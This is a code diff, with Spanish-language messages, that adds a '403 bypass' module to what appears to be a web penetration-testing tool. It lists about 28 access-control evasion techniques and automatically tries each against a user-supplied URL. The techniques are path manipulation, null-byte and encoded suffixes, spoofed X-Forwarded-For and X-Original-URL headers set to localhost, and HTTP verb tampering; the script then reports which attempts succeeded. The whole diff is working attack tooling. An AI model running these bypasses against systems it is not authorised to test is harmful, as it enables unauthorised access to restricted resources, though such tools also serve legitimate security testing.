@@ -1489,6 +1489,162 @@ def run_fuzzing(url, extensions, threads, wordlist_path):
         pass
 
 
+# ── 403 Bypass ──
+
+BYPASS_TECHNIQUES = [
+    {"name": "Path con slash final", "mod": "path", "suffix": "/"},
+    {"name": "Doble slash", "mod": "path", "prefix": "//"},
+    {"name": "Path traversal", "mod": "path", "suffix": "/..;/"},
+    {"name": "Punto al final", "mod": "path", "suffix": "."},
+    {"name": "Espacio URL-encoded", "mod": "path", "suffix": "%20"},
+    {"name": "Punto URL-encoded", "mod": "path", "suffix": "%2e"},
+    {"name": "Slash URL-encoded", "mod": "path", "prefix_replace": "%2f"},
+    {"name": "Case switching", "mod": "case"},
+    {"name": "Null byte", "mod": "path", "suffix": "%00"},
+    {"name": "Tab URL-encoded", "mod": "path", "suffix": "%09"},
+    {"name": "Extension .html", "mod": "path", "suffix": ".html"},
+    {"name": "Extension .php", "mod": "path", "suffix": ".php"},
+    {"name": "Extension .json", "mod": "path", "suffix": ".json"},
+    {"name": "Header X-Original-URL", "mod": "header", "header": "X-Original-URL"},
+    {"name": "Header X-Rewrite-URL", "mod": "header", "header": "X-Rewrite-URL"},
+    {"name": "Header X-Forwarded-For: 127.0.0.1", "mod": "header_val", "header": "X-Forwarded-For", "value": "127.0.0.1"},
+    {"name": "Header X-Forwarded-Host: 127.0.0.1", "mod": "header_val", "header": "X-Forwarded-Host", "value": "127.0.0.1"},
+    {"name": "Header X-Custom-IP-Authorization: 127.0.0.1", "mod": "header_val", "header": "X-Custom-IP-Authorization", "value": "127.0.0.1"},
+    {"name": "Header X-Real-IP: 127.0.0.1", "mod": "header_val", "header": "X-Real-IP", "value": "127.0.0.1"},
+    {"name": "Header X-Host: 127.0.0.1", "mod": "header_val", "header": "X-Host", "value": "127.0.0.1"},
+    {"name": "Header X-Forwarded-For: 10.0.0.1", "mod": "header_val", "header": "X-Forwarded-For", "value": "10.0.0.1"},
+    {"name": "Metodo POST", "mod": "method", "method": "POST"},
+    {"name": "Metodo PUT", "mod": "method", "method": "PUT"},
+    {"name": "Metodo PATCH", "mod": "method", "method": "PATCH"},
+    {"name": "Metodo OPTIONS", "mod": "method", "method": "OPTIONS"},
+    {"name": "Metodo TRACE", "mod": "method", "method": "TRACE"},
+    {"name": "Override con X-HTTP-Method-Override: GET", "mod": "header_val", "header": "X-HTTP-Method-Override", "value": "GET"},
+    {"name": "Header Referer: mismo sitio", "mod": "referer"},
+]
+
+
+def run_403_bypass(url):
+    socketio.emit("bypass_status", {"status": "running", "msg": "Iniciando 403 bypass..."})
+    results = []
+    total = len(BYPASS_TECHNIQUES)
+    session = requests.Session()
+    session.headers.update({"User-Agent": "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36"})
+    session.verify = False
+
+    from urllib.parse import urlparse
+    parsed = urlparse(url)
+    base = f"{parsed.scheme}://{parsed.netloc}"
+    path = parsed.path.rstrip('/')
+
+    original_status = None
+    try:
+        resp = session.get(url, timeout=10, allow_redirects=False)
+        original_status = resp.status_code
+        original_length = len(resp.content)
+    except Exception:
+        original_length = 0
+
+    socketio.emit("bypass_status", {
+        "status": "running",
+        "msg": f"Status original: {original_status} | Probando {total} tecnicas..."
+    })
+
+    for i, tech in enumerate(BYPASS_TECHNIQUES):
+        if (i + 1) % 5 == 0:
+            socketio.emit("bypass_status", {
+                "status": "running",
+                "msg": f"Probando {i + 1}/{total}: {tech['name']}..."
+            })
+
+        try:
+            test_url = url
+            headers = {}
+            method = "GET"
+
+            if tech["mod"] == "path":
+                if tech.get("suffix"):
+                    test_url = base + path + tech["suffix"]
+                elif tech.get("prefix"):
+                    test_url = base + tech["prefix"] + path.lstrip('/')
+                elif tech.get("prefix_replace"):
+                    test_url = base + path.replace('/', tech["prefix_replace"])
+            elif tech["mod"] == "case":
+                if path:
+                    parts = path.split('/')
+                    new_parts = []
+                    for p in parts:
+                        if p:
+                            new_parts.append(p[0].upper() + p[1:] if len(p) > 1 else p.upper())
+                        else:
+                            new_parts.append(p)
+                    test_url = base + '/'.join(new_parts)
+            elif tech["mod"] == "header":
+                headers[tech["header"]] = path
+                test_url = base + "/"
+            elif tech["mod"] == "header_val":
+                headers[tech["header"]] = tech["value"]
+            elif tech["mod"] == "method":
+                method = tech["method"]
+            elif tech["mod"] == "referer":
+                headers["Referer"] = base + "/"
+
+            resp = session.request(method, test_url, headers=headers, timeout=8, allow_redirects=False)
+            status = resp.status_code
+            length = len(resp.content)
+
+            bypassed = False
+            if original_status and original_status == 403:
+                bypassed = status == 200 or (status != 403 and status != 404 and status < 500)
+
+            entry = {
+                "technique": tech["name"],
+                "url": test_url,
+                "method": method,
+                "status": status,
+                "length": length,
+                "bypassed": bypassed,
+                "headers": headers if headers else None,
+                "diff_length": length - original_length if original_length else 0,
+            }
+            results.append(entry)
+            socketio.emit("bypass_hit", entry)
+
+        except Exception:
+            results.append({
+                "technique": tech["name"],
+                "url": test_url,
+                "method": "GET",
+                "status": 0,
+                "length": 0,
+                "bypassed": False,
+                "error": True,
+            })
+
+    bypassed_count = sum(1 for r in results if r.get("bypassed"))
+    socketio.emit("bypass_result", {
+        "url": url,
+        "original_status": original_status,
+        "original_length": original_length,
+        "results": results,
+        "total": total,
+        "bypassed": bypassed_count,
+    })
+    socketio.emit("bypass_status", {
+        "status": "done",
+        "msg": f"Completado: {bypassed_count}/{total} tecnicas lograron bypass"
+    })
+
+
+@socketio.on("start_bypass")
+def handle_bypass(data):
+    url = data.get("url", "").strip()
+    if not url:
+        return
+    if not url.startswith("http"):
+        url = "https://" + url
+    threading.Thread(target=run_403_bypass, args=(url,), daemon=True).start()
+
+
 @socketio.on("start_fuzzing")
 def handle_fuzzing(data):
     url = data.get("url", "").strip()
